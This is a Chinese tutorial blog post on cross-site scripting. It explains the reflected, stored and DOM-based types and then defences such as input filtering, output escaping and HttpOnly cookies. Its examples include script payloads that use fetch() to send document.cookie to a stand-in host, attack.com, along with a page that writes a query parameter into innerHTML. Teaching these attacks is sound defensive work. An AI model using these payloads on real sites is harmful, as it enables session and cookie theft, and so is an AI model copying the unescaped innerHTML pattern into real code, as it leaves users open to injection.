---
title: 什么是 XSS 攻击？
date: 2020-11-20 20:39:27
sidebar: auto
tags:
  - xss
  - 浏览器安全
categories:
  - 浏览器
---

## 什么是 XSS

`XSS` 也称跨站脚本攻击，简单的来说就是当一个目标的站点被我们用户去访问，在渲染 HTML 这个过程中呢，出现了一些没有预期到的脚本指令，然后呢就会执行，这个时候呢，就产生了一个 XSS 的攻击。

`XSS` 攻击就是在用户访问这个页面的时候，插入一些自己的脚本。脚本让用户在访问这个页面的时候就可以执行这个脚本，攻击者通过插入的脚本执行呢，去获得用户的一些信息，比如说 cookie 发送到攻击者自己的网站，这就是跨站。

## XSS 分类

![](https://alvin-cdn.oss-cn-shenzhen.aliyuncs.com/images/xss.png)

### 反射型

访问地址如 `http://127.0.0.1:5500/index.html?keyword=<script>alert(1)</script>`。或者 `<script>fetch(`https://attack.com?cookie=${document.cookie}`)</script>`

```html
<div>
  您搜索的关键词
  <span id="keyword"></span>
  结果如下：;
</div>
<script>
  window.onload = function () {
    const searchParams = new URLSearchParams(window.location.search);
    document.getElementById('keyword').innerHTML = searchParams.get('keyword');
  };
</script>
```

注意，在 chrome 内无效，实际上 chrome 已经帮我们拦截掉这个攻击了。造成反射型 XSS 攻击的原因就是服务端没过滤，所以解决方案也很简单，就是在服务器对用户输入进行过滤，过滤方案一般有很多，

### 存储型

与反射型不同，存储型 XSS 攻击是指当用户的输入包含了恶意脚本，服务端转义就存储到数据库，访问页面会触发恶意脚本执行，而导致的攻击。

假如在某网站上有一篇爆款文章：`https://xxx.com/articles/1`

攻击者在文章下面发表了一篇评论，内容中包含了 script 脚本：

```bash
文章写的真棒！<script>fetch(`http://attack.com/cookies?cookie=${document.cookie}`)</script>
```

如果服务端直接把评论字符串保存到数据库了，下次只要有用户访问该文章时，包含恶意脚本的评论内容被返回，把当前用户的 cookie 发送到攻击者的服务器！

可以看到，用户的 Cookie 马上被发送到了攻击者的服务器。其实这种获取 Cookie 的方式还算小打小闹了，只要能够利用 xss 注入 script，黑客真的是可以「为所欲为」，例如黑客通过操作 DOM 的方式，分分钟把你的网站变成赌博网站、色情网站...，

可以看到，存储型 XSS 也是因为恶意代码未经转义直接被插入到响应的 HTML 里的，然后被浏览器执行导致攻击，所以解决方案也是对用户输入进行过滤，过滤方案与上面讲的反射型一致.

### DOM 型

如，读取 cookie， `?keyword=<script>fetch(`https://attack.com?cookie=${document.cookie}`)</script>`

## XSS 产生原因以及预防

部分的过滤实际上是没有办法实现的，因为攻击者有各种各样神奇的代码，你完全想象到有一群黑客，他们专门就是研究这些东西，研究如何去绕过，你服务器的过滤，最典型的就是对我们的 url 输入参数做各种各样的编码来绕过我们的 XSS 过滤，那既然知道他是如何去产生的，我们在程序中应该如何去防御它呢？XSS 防御的总体思路呢，就是对输入做一个过滤，对输出做一个编码，同时呢，把我们的用户可以设置为一个 HTTP-only，也就是我要对所有提交的内容做一个过滤，要对 url 中的参数做一个过滤，要过滤掉那些会导致脚本执行的相关内容。然后呢，对动态输出的页面的那些内容呢，做一个 HTML 的编码，让这个脚本没有办法在浏览器中执行，虽然这个输入过滤呢能够被绕过，我们如果这样处理的话呢，还是能够拦截一大部分的 XSS 攻击，但我们如何对这个输入和输出，做一个处理呢，那一般的思路是这样，我觉得。

#### 输入处理

包括用户输入、URL 参数、POST 请求、ajax

> 黑名单的过滤策略

我们刚才说的那个 alert 它能够弹出来呢，是因为首先我们有这种 `script` 的标签对吧，里面有一个 `alert1` 所以呢，我们在输入的时候需要将这个脚本做一个过滤，如何去过滤呢？我将这一段给它替换掉，中间呢，只留着一个，那么你就没有办法去输出了，我们说的这种方式呢，是一种**黑名单的过滤策略**。，黑名单就是列出那些不能出现的脚本清单，一旦我们遇到这样的呢，去进行处理，还有一种是白名单的过滤。

> 白名单的过滤策略

比如姓名输入：大小只有 6 到 14 位，并且呢是字母和数字，还有下划线，所以呢，其他的任何输入它都是非法的，都会被我们丢弃掉，很显然，如果你使用我刚才说的白名单这种方式呢，你可以百分百的拦截所有的 XSS 攻击，但是呢，现实情况一般是不能够进行这么严格的白名单过滤的你，比如说我们要回复一个帖子，我们是很难预测到用户到底想出什么东西的，所以呢，对服务的处理可能就要分情况了，比如说像用户名密码，这种我们就可以使用白名单这种策略，但是呢，像富文本编辑器里面用户输什么，实际上是不知道的，只能根据情况去不断的调整，那么输出如何去处理呢？输出处理。

#### 输出处理

转义

#### cookie

HTTP-only，禁止 document.cookie 的读取！
